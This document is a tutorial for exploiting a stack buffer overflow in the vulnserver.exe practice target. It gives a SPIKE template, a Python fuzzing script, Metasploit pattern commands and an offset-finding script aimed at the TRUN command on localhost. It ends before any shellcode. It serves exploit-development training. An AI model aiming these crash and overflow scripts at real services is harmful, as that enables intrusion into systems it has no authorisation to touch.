---
title: "Pentest Quick Cheatsheet"
excerpt_separator: "<!--more-->"
author_profile: false
categories:
  - bufferoverflow
tags:
  - learning
  - pentest
  - hacking
  - guide
---

# Buffer Overflow Tutorial 
> Basic EIP Bypass (vulnserver.exe)(Windows version)    
> Credits to Stephen Bradshaw: https://github.com/stephenbradshaw/vulnserver

### Description
Buffer overflow is probably the best known form of software security vulnerability. Most software developers know what a buffer overflow vulnerability is, but buffer overflow attacks against both legacy and newly-developed applications are still quite common. Part of the problem is due to the wide variety of ways buffer overflows can occur, and part is due to the error-prone techniques often used to prevent them.
Buffer overflows are not easy to discover and even when one is discovered, it is generally extremely difficult to exploit. Nevertheless, attackers have managed to identify buffer overflows in a staggering array of products and components.
In a classic buffer overflow exploit, the attacker sends data to a program, which it stores in an undersized stack buffer. The result is that information on the call stack is overwritten, including the function’s return pointer. The data sets the value of the return pointer so that when the function returns, it transfers control to malicious code contained in the attacker’s data.
Although this type of stack buffer overflow is still common on some platforms and in some development communities, there are a variety of other types of buffer overflow, including Heap buffer overflow and Off-by-one Error among others. Another very similar class of flaws is known as Format string attack. There are a number of excellent books that provide detailed information on how buffer overflow attacks work, including Building Secure Software [1], Writing Secure Code [2], and The Shellcoder’s Handbook [3].
At the code level, buffer overflow vulnerabilities usually involve the violation of a programmer’s assumptions. Many memory manipulation functions in C and C++ do not perform bounds checking and can easily overwrite the allocated bounds of the buffers they operate upon. Even bounded functions, such as strncpy(), can cause vulnerabilities when used incorrectly. The combination of memory manipulation and mistaken assumptions about the size or makeup of a piece of data is the root cause of most buffer overflows.
Buffer overflow vulnerabilities typically occur in code that:
• Relies on external data to control its behavior
• Depends upon properties of the data that are enforced outside of the immediate scope of the code
• Is so complex that a programmer cannot accurately predict its behavior


## Required Tools or Files
* [Immunity Debugger](https://debugger.immunityinc.com/ID_register.py) for Windows  (you can fill out fake info for downloading)
- [Python](https://www.python.org/downloads/) (Code editor and compiler)
- [Visual Studio](https://visualstudio.microsoft.com/) (Code editor)
* [Mona.py](https://github.com/corelan/mona) (Mona module for Immunity debugger)

## Sections
* Setup
* Spiking
* Fuzzing
* Finding the Offset
* Overwrighting the EIP
* Finding bad charaters
* Finding the right module
* Generating the shell code

## Setup
**Vulnserver**     
* Download vulnserver and the 'essfunc.dll' (make sure they are together in a folder)
* Connecting. Run 'vulnserver.exe' then you can connect with netcat
```console
nc 127.0.0.1 9999
```
127.0.0.1 (localhost) on port 9999


**Immunity Debugger**    
* Downlaod and install Immunity debugger, then run once and close.
* Install Python 2.7.14 (or a higher 2.7.xx version) into c:\python27, thus overwriting the version that was bundled with Immunity. This is needed to avoid TLS issues when trying to update mona. Make sure you are installing the 32bit version of python. 

**Mona.py**    
* Download Mona.py and place the Mona.py file in 'PyCommands' folder (inside the Immunity Debugger application folder).


## Spiking
Spiking is the art of finding a vunerable command withint the applicaion you are attacking. For this example we know that the "TRUN" command is vunerable. 

The vulnerable service command is "TRUN," but in reality, you will likely have to use the script (generic_send_tcp) on multiple commands until the program breaks. 
If you do NOT see any commands to test, proceed to the FAQ at the end of this README.md file.
Run Immunity as Admin.
Run the executable you found. (or downloaded for practice)
Attach to the executable process.
Click the "Play" button in Immunity, ensure it says Running on the bottom right-hand corner.
Use the provided command file
```console
s_readline();
s_string("STATS ");
s_string_variable("0");
```
ensuring that you edit the 'STATS' command with whatever command you're attempting to test ('TRUN' in our case). 
```console
generic_send_tcp IP port command.spk 0 0
```
After you utilize the command.spk, look to see if there's an Access Violation in Immunity, if there is not, edit the command within the command.spk to a different one and retest. 

## Fuzzing
Fuzzing is to test the application is veunerable on the found exploitable input (We need to send enough data to crash the application)

fuzz.py Script
```python
#!/usr/bin/python
from __future__ import print_function
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('127.0.0.1',9999))

                s.send(('TRUN /.:/' + buffer))
                s.close()
                sleep(1)
                buffer = buffer + "A"*100

        except:
                print("Fuzzing crashed at %s bytes" % str(len(buffer)))
```

Edit the provided fuzz.py script. Replace the IP, PORT, and TRUN command with the IP, port, and command you want to test.
Restart Immunity debugger + the Exe and attach as you did previously.
Run the script 
```console
python fuzz.py
```
Try to use CTRL+C to stop the script exactly when you see an Access Violation pop-up in Immunity. Doing so will ensure you can more accurately estimate the bytes it took to crash it.
Write down the number of bytes it took to crash the program.


## Finding the Offset
The correct identification of the offset will help ensure that the Shellcode you generate will not immediately crash the program.

1. Generate pattern code, replacing the number in the command with the number of bytes it took to crash the program.
```console
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
```

2. Copy the output of the pattern_create command and edit the offset.py script provided in this repository. Replace the existing offset value portion of the script with the pattern that you generated from the command. Replace the IP, Port, and Command as you did in the previous testing sections.
Closeout Immunity + the executable program.
3. Repeat the process of relaunching Immunity and attaching to the executable program.
Run the script
```python
#!/usr/bin/python
import sys, socket

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"

try:
       s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       s.connect(('127.0.0.1',9999))
       s.recv(1024)
       s.send(('TRUN /.:/' + offset + '\r\n').encode())
       s.close()
       print("[+] Poc sent")

except Exception as e:
       print(e)
       print("Error connecting to server")
       sys.exit()
```

```console
python offset.py
```

4. Go into Immunity and look for a number written in the EIP space.
IMAGE HERE 

If there is no number written into the EIP space, the number of bytes you identified in your Fuzz may be off. Go back to step 1 and regenerate pattern code, using a number higher than whatever you had written to the script. For instance, if you used 700, try 1000, or 1200. If you are unsuccessful, you may have messed up during Fuzzing. Go back to the Fuzzing section and try to stop the script faster when you see the Access Violation in Immunity.
When you find a number written to the EIP, write this number down somewhere. 
Use the following command, replacing the -l switch value with your identified fuzz-bytes number from step 1, and replace the -q switch with the number that is written to the EIP. 
```console
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 386F4337
```

If everything is correct, when you run the above command, you should get an exact offset match that looks like this: [*] Exact match at offset 2003
Ensure that you write down this offset match.

